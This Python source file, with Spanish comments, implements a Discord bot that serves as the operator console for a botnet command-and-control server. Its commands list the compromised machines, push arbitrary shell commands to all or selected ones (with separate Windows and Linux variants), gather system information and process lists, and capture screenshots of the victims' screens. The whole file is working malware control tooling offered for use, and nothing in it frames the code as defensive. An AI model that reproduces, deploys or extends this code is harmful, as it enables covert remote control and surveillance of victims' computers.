import discord
from discord.ext import commands
import logging
import configparser
import os
import requests
import sys
import threading
import time

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(os.path.join(os.path.dirname(__file__), "..", "logs", "discord_bot.log"), encoding="utf-8"),
        logging.StreamHandler()
    ]
)

# Cargar configuración de Discord
config_bot = configparser.ConfigParser()
config_bot.read(os.path.join(os.path.dirname(__file__), "..", "config", "config_bot.ini"))

if not config_bot.has_section('DISCORD'):
    raise ValueError("No section: 'DISCORD' in the configuration file")

# Configurar bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# URL del servidor C&C
API_URL = "http://127.0.0.1:5000"

@bot.event
async def on_ready():
    logging.info(f'Bot conectado como {bot.user}')
    print(f'Bot conectado como {bot.user}')

@bot.command(name='listar_bots')
async def listar_bots_command(ctx):
    """Lista todos los bots conectados al servidor C&C."""
    try:
        response = requests.get(f"{API_URL}/listar_bots")
        if response.status_code == 200:
            data = response.json()
            if "message" in data:
                await ctx.send(data["message"])
            else:
                mensaje = "🤖 **Bots Conectados:**\n\n"
                for bot in data:
                    mensaje += f"**ID:** {bot['id']}\n"
                    mensaje += f"**Sistema:** {bot['so']}\n"
                    mensaje += f"**Dirección:** {bot['direccion']}\n"
                    mensaje += "─" * 20 + "\n"
                await ctx.send(mensaje)
        else:
            await ctx.send(f"❌ Error al conectar con el servidor C&C: {response.status_code}")
    except Exception as e:
        logging.error(f"Error al listar bots: {e}")
        await ctx.send(f"❌ Error al conectar con el servidor C&C: {str(e)}")

@bot.command(name='enviar_comando')
async def enviar_comando_command(ctx, *, comando: str):
    """
    Envía un comando a los bots conectados.
    Uso: !enviar_comando <comando>
    """
    try:
        # Si el comando contiene '||', separa los comandos para Windows y Linux
        if '||' in comando:
            comando_windows, comando_linux = [cmd.strip() for cmd in comando.split('||')]
        else:
            comando_windows = comando_linux = comando

        data = {
            "comando_windows": comando_windows,
            "comando_linux": comando_linux,
            "seleccion": "1"
        }
        
        await ctx.send(f"🚀 Enviando comando...\nWindows: `{comando_windows}`\nLinux: `{comando_linux}`")
        
        response = requests.post(f"{API_URL}/enviar_comando", json=data)
        if response.status_code == 200:
            data = response.json()
            if "message" in data:
                await ctx.send(data["message"])
            else:
                for bot_id, respuesta in data["respuestas"].items():
                    mensaje = f"📟 **Respuesta del Bot {bot_id}:**\n```\n{respuesta}\n```"
                    await ctx.send(mensaje)
        else:
            await ctx.send(f"❌ Error al enviar comando: {response.status_code}")
    except Exception as e:
        logging.error(f"Error al enviar comando: {e}")
        await ctx.send(f"❌ Error al enviar comando: {str(e)}")

@bot.command(name='apagar')
@commands.has_permissions(administrator=True)
async def apagar_command(ctx):
    """Apaga el servidor C&C y desconecta todos los bots."""
    try:
        await ctx.send("⚠️ Apagando servidor C&C...")
        response = requests.post(f"{API_URL}/shutdown")
        if response.status_code == 200:
            await ctx.send("✅ Servidor apagado correctamente")
            # Cerrar el bot de Discord
            await bot.close()
        else:
            await ctx.send("❌ Error al apagar el servidor")
    except Exception as e:
        logging.error(f"Error al apagar el servidor: {e}")
        await ctx.send(f"❌ Error al apagar el servidor: {str(e)}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ No tienes permisos para usar este comando")
    else:
        await ctx.send(f"❌ Error: {str(error)}")

@bot.command(name='sysinfo')
async def sysinfo_command(ctx, bot_id: int = None):
    """Obtiene información del sistema de los bots."""
    try:
        data = {
            "comando_windows": "systeminfo",
            "comando_linux": "uname -a && lsb_release -a",
            "seleccion": "4" if bot_id else "1",
            "bot_id": bot_id
        }
        
        await ctx.send("🔍 Obteniendo información del sistema...")
        response = requests.post(f"{API_URL}/enviar_comando", json=data)
        if response.status_code == 200:
            data = response.json()
            for bot_id, respuesta in data.get("respuestas", {}).items():
                mensaje = f"💻 **Bot {bot_id} - Información del Sistema:**\n```\n{respuesta}\n```"
                await ctx.send(mensaje)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='procesos')
async def procesos_command(ctx, bot_id: int = None):
    """Lista los procesos en ejecución."""
    try:
        data = {
            "comando_windows": "tasklist",
            "comando_linux": "ps aux",
            "seleccion": "4" if bot_id else "1",
            "bot_id": bot_id
        }
        
        await ctx.send("🔍 Listando procesos...")
        response = requests.post(f"{API_URL}/enviar_comando", json=data)
        if response.status_code == 200:
            data = response.json()
            for bot_id, respuesta in data.get("respuestas", {}).items():
                mensaje = f"⚙️ **Bot {bot_id} - Procesos:**\n```\n{respuesta}\n```"
                await ctx.send(mensaje)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='screenshot')
async def screenshot_command(ctx, bot_id: int = None):
    """Captura la pantalla del bot."""
    try:
        data = {
            "comando_windows": "screenshot",
            "comando_linux": "screenshot",
            "tipo": "screenshot",
            "seleccion": "4" if bot_id else "1",
            "bot_id": bot_id
        }
        
        await ctx.send("📸 Capturando pantalla...")
        response = requests.post(f"{API_URL}/enviar_comando", json=data)
        if response.status_code == 200:
            data = response.json()
            for bot_id, respuesta in data.get("respuestas", {}).items():
                # La respuesta debe ser una imagen en base64
                if respuesta.startswith("data:image"):
                    # Convertir base64 a archivo
                    import io
                    import base64
                    image_data = base64.b64decode(respuesta.split(',')[1])
                    file = discord.File(io.BytesIO(image_data), filename=f"screenshot_bot_{bot_id}.png")
                    await ctx.send(f"📷 **Screenshot del Bot {bot_id}**", file=file)
                else:
                    await ctx.send(f"❌ Error al capturar pantalla del Bot {bot_id}: {respuesta}")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='ayuda')
async def ayuda_command(ctx):
    """Muestra la ayuda del bot."""
    help_text = """
🤖 **Comandos Disponibles:**

`!listar_bots`
- Lista todos los bots conectados al servidor C&C

`!sysinfo [bot_id]`
- Obtiene información del sistema
- Si no se especifica bot_id, obtiene de todos los bots

`!procesos [bot_id]`
- Lista los procesos en ejecución
- Si no se especifica bot_id, lista de todos los bots

`!screenshot [bot_id]`
- Captura la pantalla del bot
- Si no se especifica bot_id, captura de todos los bots

`!enviar_comando <comando>`
- Envía un comando personalizado
- Para especificar diferentes comandos para Windows y Linux:
  `!enviar_comando dir || ls -la`

`!apagar`
- Apaga el servidor C&C y desconecta todos los bots
- Solo administradores pueden usar este comando

`!ayuda`
- Muestra este mensaje de ayuda

**Ejemplos:**
```
!sysinfo 1
!procesos
!screenshot 2
!enviar_comando "echo Hola" || "echo Hello"
```
"""
    await ctx.send(help_text)

def iniciar_servidor():
    """Inicia el servidor API y CnC en procesos separados"""
    import subprocess
    import os

    try:
        # Ruta al archivo api_server.py
        api_server_path = os.path.join(os.path.dirname(__file__), "api_server.py")
        
        print("[*] Iniciando servidor API...")
        
        # Iniciar el servidor API mostrando su salida
        process = subprocess.Popen(
            [sys.executable, api_server_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            bufsize=1
        )
        
        # Crear hilos para mostrar la salida del servidor en tiempo real
        def mostrar_salida(pipe, prefix):
            for line in iter(pipe.readline, ''):
                print(f"{prefix}: {line.strip()}")
            
        threading.Thread(target=mostrar_salida, args=(process.stdout, "API")).start()
        threading.Thread(target=mostrar_salida, args=(process.stderr, "ERROR")).start()
        
        # Esperar a que el servidor esté listo
        print("[*] Esperando a que el servidor esté listo...")
        intentos = 0
        while intentos < 10:
            try:
                response = requests.get("http://127.0.0.1:5000/listar_bots")
                if response.status_code == 200:
                    print("[+] Servidor API iniciado correctamente")
                    return process
                else:
                    print(f"[-] Error: El servidor respondió con código {response.status_code}")
            except requests.exceptions.ConnectionError:
                print(f"[*] Intento {intentos + 1}: El servidor aún no está listo...")
                intentos += 1
                time.sleep(1)
            except Exception as e:
                print(f"[-] Error inesperado: {e}")
                break
        
        print("[-] Error: No se pudo iniciar el servidor API")
        process.kill()
        sys.exit(1)

    except Exception as e:
        logging.error(f"Error al iniciar el servidor: {e}")
        print(f"[-] Error crítico: {e}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        # Silenciar advertencias no críticas
        import warnings
        warnings.filterwarnings("ignore", category=Warning)
        
        # Configurar logging más limpio para discord
        discord_logger = logging.getLogger('discord')
        discord_logger.setLevel(logging.ERROR)
        
        # Cargar configuraciones
        config_bot = configparser.ConfigParser()
        config_bot.read(os.path.join(os.path.dirname(__file__), "..", "config", "config_bot.ini"))
        if not config_bot.has_section('DISCORD'):
            raise ValueError("No section: 'DISCORD' in the configuration file")

        # Iniciar el servidor API
        api_process = iniciar_servidor()

        try:
            print("[*] Iniciando bot de Discord...")
            # Iniciar el bot de Discord
            bot.run(config_bot.get("DISCORD", "BOT_TOKEN"))
        finally:
            # Asegurar que el servidor API se cierre cuando el bot se detenga
            if api_process:
                api_process.terminate()
                api_process.wait()
                print("[+] Servidor API cerrado correctamente")

    except Exception as e:
        logging.error(f"Error en la ejecución principal: {e}")